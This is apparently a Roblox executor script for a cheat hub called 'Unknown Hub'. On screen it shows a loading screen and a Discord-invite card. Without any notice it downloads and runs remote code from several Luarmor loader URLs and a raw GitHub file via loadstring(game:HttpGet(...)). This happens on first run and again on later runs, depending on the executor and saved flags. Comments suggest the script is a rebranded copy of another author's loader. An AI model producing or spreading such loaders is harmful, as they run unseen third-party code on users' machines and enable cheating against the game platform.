-- [[ Unknown Hub - Full Screen UI ]] --
local Players       = game:GetService("Players")
local TweenService  = game:GetService("TweenService")
local HttpService   = game:GetService("HttpService")
local CoreGui       = game:GetService("CoreGui")
local LocalPlayer   = Players.LocalPlayer

local function GetSafeGui()
    if gethui then return gethui() end
    if CoreGui then return CoreGui end
    return LocalPlayer:FindFirstChildOfClass("PlayerGui") or LocalPlayer:WaitForChild("PlayerGui")
end

local playerGui = GetSafeGui() 

-- [[ Color Palette (Extracted from your script) ]] --
local COLOR_BASE_BG       = Color3.fromRGB(16, 24, 39)
local COLOR_CARD_GRAD_1   = Color3.fromRGB(12, 18, 32)
local COLOR_CARD_GRAD_2   = Color3.fromRGB(21, 30, 47)
local COLOR_CARD_GRAD_3   = Color3.fromRGB(10, 82, 120)
local COLOR_STROKE_GLOW   = Color3.fromRGB(56, 189, 248)
local COLOR_STROKE_MAIN   = Color3.fromRGB(56, 189, 248)
local COLOR_SURFACE       = Color3.fromRGB(30, 41, 59)
local COLOR_SURFACE_DARK  = Color3.fromRGB(25, 32, 48)
local COLOR_TEAL_ON       = Color3.fromRGB(52, 180, 230)
local COLOR_TEXT          = Color3.fromRGB(241, 245, 249)
local COLOR_TEXT_MUTED    = Color3.fromRGB(148, 163, 184)

-- [[ Full Screen Loading Screen System ]] --
local function showLoadingScreen(duration, loadingText)
    local screen = Instance.new("ScreenGui")
    screen.Name = "UnknownHubLoading"
    screen.IgnoreGuiInset = true
    screen.ResetOnSpawn = false
    screen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screen.Parent = playerGui

    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = COLOR_BASE_BG
    bg.BorderSizePixel = 0
    bg.Parent = screen

    local txt = Instance.new("TextLabel")
    txt.Size = UDim2.new(0.6, 0, 0, 50)
    txt.Position = UDim2.new(0.5, 0, 0.5, 0)
    txt.AnchorPoint = Vector2.new(0.5, 0.5)
    txt.BackgroundTransparency = 1
    txt.Text = loadingText or "Loading Unknown Hub..."
    txt.TextColor3 = COLOR_TEAL_ON
    txt.Font = Enum.Font.GothamBold
    txt.TextSize = 28
    txt.Parent = bg

    -- Fake loading animation
    local dots = ""
    task.spawn(function()
        for i = 1, duration * 4 do
            dots = dots .. "."
            if #dots > 3 then dots = "" end
            txt.Text = (loadingText or "Loading Unknown Hub") .. dots
            task.wait(0.25)
        end
    end)

    -- Fade out and destroy
    task.delay(duration, function()
        local tween = TweenService:Create(bg, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {BackgroundTransparency = 1})
        local tween2 = TweenService:Create(txt, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {TextTransparency = 1})
        tween:Play()
        tween2:Play()
        tween.Completed:Connect(function()
            screen:Destroy()
        end)
    end)
end

-- Trigger Initial Load Screen
showLoadingScreen(2.5, "Initializing Unknown Hub")

-- [[ Original Backend Features (Adapted for Unknown Hub) ]] --
local function checkExecutor()
    local execName = "unknown"
    if identifyexecutor then execName = tostring(identifyexecutor())
    elseif getexecutorname then execName = tostring(getexecutorname()) end
    return string.find(string.lower(execName), "xeno")
end

local FIRST_RUN_PATH = "unknown_firstrun.json"
local function fileExistsGlobal(path) return (isfile and pcall(isfile, path) and isfile(path)) or false end

local function checkFirstRun()
    if fileExistsGlobal(FIRST_RUN_PATH) then
        local ok, raw = pcall(readfile, FIRST_RUN_PATH)
        if ok and raw then
            local ok2, data = pcall(function() return HttpService:JSONDecode(raw) end)
            if ok2 and type(data) == "table" and data.__LuarmorDone == true then return true end
        end
    end
    return false
end

local function markFirstRunDone()
    pcall(function()
        local json = HttpService:JSONEncode({ __LuarmorDone = true })
        writefile(FIRST_RUN_PATH, json)
    end)
end

local needFirstRun = not checkFirstRun()
if needFirstRun then markFirstRunDone() end

if checkExecutor() then
    task.spawn(function() loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/66e067f17cbfa177b7bed91c1bdcb466.lua"))() end)
    if needFirstRun then
        task.delay(2, function()
            pcall(function() loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/4361856ec1a1756e11427e07dd6ec7bb.lua"))() end)
        end)
    end
    return 
end

config = config or {}
local CONFIG_PATH = "unknown_config.json"
local function fileExists(path) return (isfile and pcall(isfile, path) and isfile(path)) or false end
local function readText(path) if not isfile then return nil end local ok, data = pcall(readfile, path) if ok then return data end return nil end
local function writeText(path, text) if not writefile then return false end return pcall(writefile, path, text) end

local function loadConfigHard()
    if fileExists(CONFIG_PATH) then
        local raw = readText(CONFIG_PATH)
        if raw then
            local ok, decoded = pcall(function() return HttpService:JSONDecode(raw) end)
            if ok and type(decoded) == "table" then for k, v in pairs(decoded) do config[k] = v end end
        end
    end
end

local function saveConfigHard()
    if type(saveConfig) == "function" then local ok = pcall(saveConfig) if ok then return end end
    local ok, json = pcall(function() return HttpService:JSONEncode(config) end)
    if ok then writeText(CONFIG_PATH, json) end
end

loadConfigHard()

local DISCORD_LINK  = "https://discord.gg/unknown-hub" -- Changed link
local REMOTE_URL    = "https://raw.githubusercontent.com/tkhanhh/Spicy/refs/heads/main/loo" -- Kept original

local function runRemote()
    pcall(function()
        local src = game:HttpGet(REMOTE_URL)
        local f = loadstring(src)
        if type(f) == "function" then f() end
    end)
end

local firstShownFlag = (config.__UnknownHubShown == true)

if firstShownFlag then
    runRemote()
    if needFirstRun then
        task.delay(2, function()
            pcall(function() loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/4361856ec1a1756e11427e07dd6ec7bb.lua"))() end)
        end)
    end
    return
end

config.__UnknownHubShown = true
saveConfigHard()
runRemote()

if needFirstRun then
    task.delay(2, function()
        pcall(function() loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/4361856ec1a1756e11427e07dd6ec7bb.lua"))() end)
    end)
end

-- [[ UI Generation (Scaled up to nearly fill screen) ]] --
local hubGui = Instance.new("ScreenGui")
hubGui.Name = "UnknownHubMain"
hubGui.IgnoreGuiInset = true
hubGui.ResetOnSpawn = false
hubGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
hubGui.Parent = playerGui

-- Massive Card (80% of screen width, 70% of screen height)
local card = Instance.new('Frame')
card.BackgroundColor3 = COLOR_BASE_BG
card.BorderSizePixel = 0
card.Size = UDim2.new(0.8, 0, 0.7, 0)
card.AnchorPoint = Vector2.new(0.5, 0.5)
card.Position = UDim2.new(0.5, 0, 0.5, 0)
card.Parent = hubGui
Instance.new('UICorner', card).CornerRadius = UDim.new(0, 30)

local g = Instance.new('UIGradient', card)
g.Rotation = 35
g.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0.00, COLOR_CARD_GRAD_1),
    ColorSequenceKeypoint.new(0.55, COLOR_CARD_GRAD_2),
    ColorSequenceKeypoint.new(1.00, COLOR_CARD_GRAD_3),
})

local s1 = Instance.new('UIStroke', card)
s1.Thickness = 12
s1.Transparency = 0.90
s1.LineJoinMode = Enum.LineJoinMode.Round
s1.Color = COLOR_STROKE_GLOW

local s2 = Instance.new('UIStroke', card)
s2.Thickness = 3
s2.Transparency = 0.15
s2.LineJoinMode = Enum.LineJoinMode.Round
s2.Color = COLOR_STROKE_MAIN

-- Top Bar
local top = Instance.new('Frame')
top.Parent = card
top.BackgroundColor3 = COLOR_SURFACE_DARK
top.BackgroundTransparency = 0.15
top.BorderSizePixel = 0
top.Size = UDim2.new(1, -30, 0, 60)
top.Position = UDim2.new(0, 15, 0, 15)
Instance.new('UICorner', top).CornerRadius = UDim.new(0, 18)

local lbl = Instance.new('TextLabel')
lbl.Parent = top
lbl.BackgroundTransparency = 1
lbl.Position = UDim2.new(0, 20, 0, 0)
lbl.Size = UDim2.new(1, -80, 1, 0)
lbl.Font = Enum.Font.GothamBold
lbl.Text = "UNKNOWN HUB"
lbl.TextXAlignment = Enum.TextXAlignment.Center
lbl.TextSize = 28
lbl.TextColor3 = COLOR_TEXT
local grad = Instance.new('UIGradient', lbl)
grad.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0.00, Color3.fromRGB(34, 211, 238)),
    ColorSequenceKeypoint.new(0.50, Color3.fromRGB(255, 255, 255)),
    ColorSequenceKeypoint.new(1.00, Color3.fromRGB(99, 102, 241)),
})

-- Close Button
local closeBtn = Instance.new('TextButton')
closeBtn.Parent = top
closeBtn.BackgroundColor3 = COLOR_SURFACE
closeBtn.AutoButtonColor = true
closeBtn.BorderSizePixel = 0
closeBtn.Text = "X"
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextSize = 20
closeBtn.TextColor3 = COLOR_TEXT
closeBtn.Size = UDim2.fromOffset(40, 40)
closeBtn.Position = UDim2.new(1, -50, 0.5, -20)
Instance.new('UICorner', closeBtn).CornerRadius = UDim.new(0, 10)
local closeStroke = Instance.new('UIStroke', closeBtn)
closeStroke.Thickness = 1
closeStroke.Transparency = 0.25
closeStroke.Color = COLOR_STROKE_MAIN

-- Body Text
local body = Instance.new('TextLabel')
body.Parent = card
body.BackgroundTransparency = 1
body.Position = UDim2.new(0, 40, 0, 100)
body.Size = UDim2.new(1, -80, 0, 120)
body.Text = "Welcome to Unknown Hub\nJoin our Discord for secret features\nGet the latest updates and enters giveaways"
body.TextWrapped = true
body.Font = Enum.Font.Gotham
body.TextSize = 22
body.TextXAlignment = Enum.TextXAlignment.Center
body.TextYAlignment = Enum.TextYAlignment.Center
body.TextColor3 = COLOR_TEXT

-- Copy Button (Massive)
local copyBtn = Instance.new('TextButton')
copyBtn.Parent = card
copyBtn.Size = UDim2.new(1, -60, 0, 70)
copyBtn.Position = UDim2.new(0, 30, 1, -180)
copyBtn.BackgroundColor3 = COLOR_TEAL_ON
copyBtn.BorderSizePixel = 0
copyBtn.Text = "Copy Discord Invite"
copyBtn.Font = Enum.Font.GothamBlack
copyBtn.TextSize = 24
copyBtn.TextColor3 = Color3.fromRGB(14, 25, 38)
Instance.new('UICorner', copyBtn).CornerRadius = UDim.new(0, 16)
local cpStroke = Instance.new('UIStroke', copyBtn)
cpStroke.Thickness = 2
cpStroke.Transparency = 0.15
cpStroke.Color = COLOR_STROKE_MAIN

-- Link Text
local linkBtn = Instance.new('TextButton')
linkBtn.Parent = card
linkBtn.BackgroundTransparency = 1
linkBtn.BorderSizePixel = 0
linkBtn.Position = UDim2.new(0, 30, 1, -100)
linkBtn.Size = UDim2.new(1, -60, 0, 30)
linkBtn.Text = "discord.gg/unknown-hub"
linkBtn.Font = Enum.Font.GothamBold
linkBtn.TextSize = 18
linkBtn.TextColor3 = COLOR_TEXT
linkBtn.AutoButtonColor = true

-- Toast Notification
local toast = Instance.new('TextLabel')
toast.Parent = card
toast.BackgroundTransparency = 1
toast.Position = UDim2.new(0, 30, 1, -68)
toast.Size = UDim2.new(1, -60, 0, 24)
toast.Text = ""
toast.Font = Enum.Font.Gotham
toast.TextSize = 16
toast.TextXAlignment = Enum.TextXAlignment.Center
toast.TextColor3 = COLOR_TEXT_MUTED

-- Clipboard Logic
local function copyToClipboard(text)
    if type(text) ~= "string" then return false end
    if setclipboard and type(setclipboard) == "function" then if pcall(setclipboard, text) then return true end end
    if toclipboard and type(toclipboard) == "function" then if pcall(toclipboard, text) then return true end end
    if syn and type(syn) == "table" and type(syn.write_clipboard) == "function" then if pcall(syn.write_clipboard, text) then return true end end
    return false
end

-- Button Events (Features loading screen on tap as requested)
copyBtn.MouseButton1Click:Connect(function()
    -- Mini loading screen on button tap
    showLoadingScreen(0.8, "Copying Link")
    
    task.delay(0.8, function() -- Wait for loading screen to finish
        if copyToClipboard(DISCORD_LINK) then
            toast.Text = "Invite link copied to clipboard."
        else
            toast.Text = "Clipboard not supported. Link: "..DISCORD_LINK
        end
    end)
end)

linkBtn.MouseButton1Click:Connect(function()
    showLoadingScreen(0.8, "Copying Link")
    task.delay(0.8, function()
        if copyToClipboard(DISCORD_LINK) then
            toast.Text = "Link copied: discord.gg/unknown-hub"
        else
            toast.Text = "Clipboard not supported. Link: discord.gg/unknown-hub"
        end
    end)
end)

closeBtn.MouseButton1Click:Connect(function()
    local tween = TweenService:Create(card, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In), {Size = UDim2.new(0, 0, 0, 0), Position = UDim2.new(0.5, 0, 0.5, 0)})
    tween:Play()
    tween.Completed:Connect(function()
        hubGui:Destroy()
    end)
end)

-- Entrance Animation
card.Size = UDim2.new(0, 0, 0, 0)
local tweenIn = TweenService:Create(card, TweenInfo.new(0.6, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = UDim2.new(0.8, 0, 0.7, 0)})
tweenIn:Play()
